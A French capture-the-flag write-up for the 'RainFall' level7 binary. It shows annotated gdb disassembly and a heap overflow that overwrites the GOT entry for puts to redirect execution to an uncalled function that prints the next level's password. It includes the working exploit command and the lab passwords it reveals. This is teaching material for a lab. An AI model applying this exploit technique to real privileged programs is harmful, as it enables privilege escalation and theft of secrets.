## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le level6
  $ ssh level7@127.0.0.1 -p 4242
     _____       _       ______    _ _
    |  __ \     (_)     |  ____|  | | |
    | |__) |__ _ _ _ __ | |__ __ _| | |
    |  _  /  _` | | '_ \|  __/ _` | | |
    | | \ \ (_| | | | | | | | (_| | | |
    |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                  Good luck & Have fun

    To start, ssh with level0/level0 on 10.0.2.15:4242
  level7@127.0.0.1's password f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
  [...]
  level7@RainFall:~$
  
  # On regarde ce qu'on a
  level7@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 level7 level7   80 Mar  9  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
    -rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
    -rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile

  # On teste les arguments
  level7@RainFall:~$ ./level7
    Segmentation fault (core dumped)
  level7@RainFall:~$ ./level7 test
    Segmentation fault (core dumped)
  level7@RainFall:~$ ./level7 test test
    ~~
  level7@RainFall:~$ ./level7 test test test
    ~~
  level7@RainFall:~$ ./level7 SUPERLOOOOOOOOOOOOOOOOOOOOOOOOOOOOONNNNNNNNNGUESTRIIIIIIIIIIIIIING SUPERLOOOOOOOOOOOOOOOOOOOOOOOOOOOOONNNNNNNNNGUESTRIIIIIIIIIIIIIING
    Segmentation fault (core dumped)
  ```
  * On segfault avec un nombre d'arguments < 2
  * On segfault avec des arguments trop grands (exploit this)
  * On print ~~ avec des bons arguments


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level7@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level7@RainFall:/tmp$ gdb ~/level7
      [...]
      Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info functions
      All defined functions:

      Non-debugging symbols:
      0x0804836c  _init
      0x080483b0  printf
      0x080483b0  printf@plt
      0x080483c0  fgets
      0x080483c0  fgets@plt
      0x080483d0  time
      0x080483d0  time@plt
      0x080483e0  strcpy
      0x080483e0  strcpy@plt
      0x080483f0  malloc
      0x080483f0  malloc@plt
      0x08048400  puts
      0x08048400  puts@plt
      0x08048410  __gmon_start__
      0x08048410  __gmon_start__@plt
      0x08048420  __libc_start_main
      0x08048420  __libc_start_main@plt
      0x08048430  fopen
      0x08048430  fopen@plt
      0x08048440  _start
      0x08048470  __do_global_dtors_aux
      0x080484d0  frame_dummy # Func frame_dummy
      0x080484f4  m           # Func m
      0x08048521  main        # Func main
      0x08048610  __libc_csu_init
      0x08048680  __libc_csu_fini
      0x08048682  __i686.get_pc_thunk.bx
      0x08048690  __do_global_ctors_aux
      0x080486bc  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x80486e9
      0x80486e9:	 "r"

    gdb-peda$ x/s 0x80486eb
      0x80486eb:	 "/home/user/level8/.pass"

    gdb-peda$ x/s 0x8049960
      0x8049960 <c>:	 ""

    gdb-peda$ x/s 0x8048703
      0x8048703:	 "~~"

    gdb-peda$ x/s 0x80486e0
      0x80486e0:	 "%s - %d\n"

    gdb-peda$ x/s 0x8049960
      0x8049960 <c>:	 ""
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # Init, align et alloue 32 octets
      0x08048521 <+0>:   push   ebp
      0x08048522 <+1>:   mov    ebp,esp
      0x08048524 <+3>:   and    esp,0xfffffff0
      0x08048527 <+6>:   sub    esp,0x20

      # ESP + 28 (appellons cette addresse array1) = malloc(8)
      0x0804852a <+9>:   mov    DWORD PTR [esp],0x8       # Push 8 sur la stack
      0x08048531 <+16>:   call   0x80483f0 <malloc@plt>   # Call malloc avec ca
      0x08048536 <+21>:   mov    DWORD PTR [esp+0x1c],eax # Stocke eax (retour malloc) dans ESP + 28

      # array1[0] = 1
      0x0804853a <+25>:   mov    eax,DWORD PTR [esp+0x1c] # Déréférence le pointeur et le stock dans eax
      0x0804853e <+29>:   mov    DWORD PTR [eax],0x1      # On stocke 1 à l'index 0 du malloc

      # array1[1] = malloc(8)
      0x08048544 <+35>:   mov    DWORD PTR [esp],0x8      # Push 8 sur la stack
      0x0804854b <+42>:   call   0x80483f0 <malloc@plt>   # Call malloc
      0x08048550 <+47>:   mov    edx,eax                  # Met le retour du malloc dans EDX
      0x08048552 <+49>:   mov    eax,DWORD PTR [esp+0x1c] # Met array1 dans eax
      0x08048556 <+53>:   mov    DWORD PTR [eax+0x4],edx  # Stocke a l'index 1 de array1 le malloc(8)

      # On fait pareil avec un 2eme malloc: ESP + 24 = array2 = [2, malloc(8)]
      0x08048559 <+56>:   mov    DWORD PTR [esp],0x8      # Push 8 sur la stack
      0x08048560 <+63>:   call   0x80483f0 <malloc@plt>   # Call malloc avec ca
      0x08048565 <+68>:   mov    DWORD PTR [esp+0x18],eax # Stocke eax (retour malloc) dans ESP + 24
      0x08048569 <+72>:   mov    eax,DWORD PTR [esp+0x18] # Déréférence le pointeur et le stock dans eax
      0x0804856d <+76>:   mov    DWORD PTR [eax],0x2      # On stocke 2 à l'index 0 du malloc
      0x08048573 <+82>:   mov    DWORD PTR [esp],0x8      # Push 8 sur la stack
      0x0804857a <+89>:   call   0x80483f0 <malloc@plt>   # Call malloc
      0x0804857f <+94>:   mov    edx,eax                  # Met le retour du malloc dans EDX
      0x08048581 <+96>:   mov    eax,DWORD PTR [esp+0x18] # Met array2 dans eax
      0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx  # Stocke a l'index 1 de array2 le malloc(8)

      # Call strcpy(array1[1], ARGV[1])
      0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]  # Met ARGV dans eax
      0x0804858b <+106>:	add    eax,0x4                  # Met &ARGV[1] dans eax
      0x0804858e <+109>:	mov    eax,DWORD PTR [eax]      # Met l'addresse contenue dans ARGV[1] dans eax
      0x08048590 <+111>:	mov    edx,eax                  # Met cette addresse dans edx
      0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c] # Met array1 dans eax
      0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]  # Met array1[1] dans eax
      0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx  # Push edx (ARGV[1]) sur la stack
      0x0804859d <+124>:	mov    DWORD PTR [esp],eax      # Push array1[1] sur la stack
      0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>   # Call strcpy avec ces 2 arguments

      # Meme chose avec array2: Call strcpy(array2[1], ARGV[2])
      0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]  # Met ARGV dans eax
      0x080485a8 <+135>:	add    eax,0x8                  # Met ARGV[2] dans eax
      0x080485ab <+138>:	mov    eax,DWORD PTR [eax]      # Met l'addresse contenue dans ARGV[2] dans eax
      0x080485ad <+140>:	mov    edx,eax                  # Met cette addresse dans edx
      0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18] # Met array2 dans eax
      0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]  # Met array2[1] dans eax
      0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx  # Push edx (ARGV[2])
      0x080485ba <+153>:	mov    DWORD PTR [esp],eax      # Push eax (array2[1])
      0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>   # Call strcpy avec ces arguments

      # Call fopen("/home/user/level8/.pass", "r")
      0x080485c2 <+161>:	mov    edx,0x80486e9            # On met "r" dans edx
      0x080485c7 <+166>:	mov    eax,0x80486eb            # On met "/home/user/level8/.pass" dans eax
      0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx  # Push edx
      0x080485d0 <+175>:	mov    DWORD PTR [esp],eax      # Push eax
      0x080485d3 <+178>:	call   0x8048430 <fopen@plt>    # Call fopen avec ces 2 strings

      # Call fgets(globale c, 68, fd = open("/home/user/level8/.pass", "r"))
      0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax    # Push eax (return fopen => file_descriptor)
      0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44   # Push 68
      0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960  # Push globale c
      0x080485eb <+202>:	call   0x80483c0 <fgets@plt>      # call fgets avec ces 3 arguments

      # Call puts("~~")
      0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703  # Push "~~"
      0x080485f7 <+214>:	call   0x8048400 <puts@plt>       # Call puts

      # Return 0
      0x080485fc <+219>:	mov    eax,0x0
      0x08048601 <+224>:	leave
      0x08048602 <+225>:	ret
      End of assembler dump.
  ```

  * Ok, donc on a un main qui alloue array1 = [1, malloc(8)] et array2 = [2, malloc(8)],...
  * Et qui les remplit avec nos arguments grace a des strcpy non protégés,...
  * Et qui met le contenu du fichier de password dans la globale c avant de print "~~"
  * Regardons m...

  ```shell
    Dump of assembler code for function n:
    # Initialisation, allocation 24 octets
    0x080484f4 <+0>:	push   ebp
    0x080484f5 <+1>:	mov    ebp,esp
    0x080484f7 <+3>:	sub    esp,0x18

    # call time(0)
    0x080484fa <+6>:	mov    DWORD PTR [esp],0x0  # Push 0
    0x08048501 <+13>:	call   0x80483d0 <time@plt> # Call time

    # call printf("%s - %d\n", globale c, return time(0))
    0x08048506 <+18>:	mov    edx,0x80486e0                  # Met "%s - %d\n" dans edx
    0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax        # Push eax (return time(0))
    0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960  # Push globale c
    0x08048517 <+35>:	mov    DWORD PTR [esp],edx            # Push edx "%s - %d\n"
    0x0804851a <+38>:	call   0x80483b0 <printf@plt>         # Call printf

    # Return
    0x0804851f <+43>:	leave
    0x08048520 <+44>:	ret
    End of assembler dump.
  ```

  * Ok on a une fonction m qui n'est pas appelée mais qui print le contenu de la globale c qui est remplie avec le contenu du fichier de password

## 2: Comportement
> Une fois recomposé, on comprend que le programme copie nos arguments en parametre dans la heap, copie le password dans une globale et print "~~".
> Une fonction qui print la globale c n'est pas appelée. Surement une fonction de debug qui a pas été appelée encore une fois: donc supprimez vos fonctions qui print vos password avant de livrer le code!

## 3: Exploit

### A: Explication

> On va grâce au premier strcpy non protégé faire un heap overflow et réécrire sur l'addresse de array2[1] contenue dans la heap.\
> A la place de cette addresse, on va passer l'addresse du GOT de la fonction puts pour que le 2eme strcpy écrive l'addresse de la fonction m dans la GOT de puts au lieu de l'écrire dans la HEAP.
> L'execution va se passer normalement jusqu'au puts qui redirigera donc vers la fonction m qui print notre password.

### B: Creation de l'exploit

* Il nous faut donc: l'adresse de m, de GOT[puts] et à partir de combien de char sur le premier parametre on va réécrire sur l'addresse array2[1]

```shell
  # Addresse de m (vu pendant l'analyse)
  gdb-peda$ info function m
    [...]
    0x080484f4  m
    [...]
  
  # Addresse de puts
  level7@RainFall:/tmp$ objdump -R ~/level7
    [...]
    08049928 R_386_JUMP_SLOT   puts
    [...]

  # On cherche au bout de combien de char on réécrit sur array2[1]
  gdb-peda$ pattern create 200 pattern7
    Writing pattern of 200 chars to filename "pattern6"
  gdb-peda$ run $(cat pattern7) RANDOMCHARS
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    [...]
    [-------------------------------------code-------------------------------------]
    [...]
    [------------------------------------stack-------------------------------------]
    [...]
    [------------------------------------------------------------------------------]
    Stopped reason: SIGSEGV
    0xb7eb8f92 in ?? ()
  gdb-peda$ pattern search
    Registers contain pattern buffer:
    [...]
    # On a notre offset
    EDX+0 found at offset: 20
    [...]
```

* On a donc tous les prérequis. En transformant en little indian l'addresse de m(\xf4\x84\x04\x08) et celle de puts(\x28\x99\x04\x08), on va pouvoir lancer de la menière suivante:
```shell
  level7@RainFall:/tmp$ ~/level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
    5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
    - 1664480933
  level7@RainFall:/tmp$ su level8
    Password:
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
  level8@RainFall:~$
```
